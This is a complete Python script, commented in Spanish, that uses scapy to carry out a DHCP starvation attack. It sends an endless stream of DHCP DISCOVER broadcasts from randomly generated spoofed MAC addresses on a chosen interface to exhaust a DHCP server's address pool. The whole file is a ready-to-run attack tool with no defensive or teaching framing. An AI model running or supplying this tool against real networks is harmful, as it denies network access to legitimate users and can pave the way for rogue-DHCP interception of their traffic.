#!/usr/bin/env python3
import argparse
import random
import time
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, conf

conf.verb = 0

def starve(iface):
    print(f"[*] INICIANDO STARVATION en {iface}...")
    print("[*] Enviando paquetes masivos para agotar el pool...")
    try:
        while True:
            # Generar MAC aleatoria
            mac = "02:" + ":".join(["%02x" % random.randint(0, 255) for _ in range(5)])
            
            # Construir paquete DHCP DISCOVER
            pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                  IP(src="0.0.0.0", dst="255.255.255.255") / \
                  UDP(sport=68, dport=67) / \
                  BOOTP(op=1, chaddr=bytes.fromhex(mac.replace(":","")), xid=random.randint(1, 0xFFFFFFFF)) / \
                  DHCP(options=[("message-type", "discover"), "end"])
            
            sendp(pkt, iface=iface, verbose=False)
            # Sin delay o muy bajo para llenar rápido
            time.sleep(0.01)
    except KeyboardInterrupt:
        print("\n[*] Starvation detenido.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", required=True)
    args = parser.parse_args()
    starve(args.iface)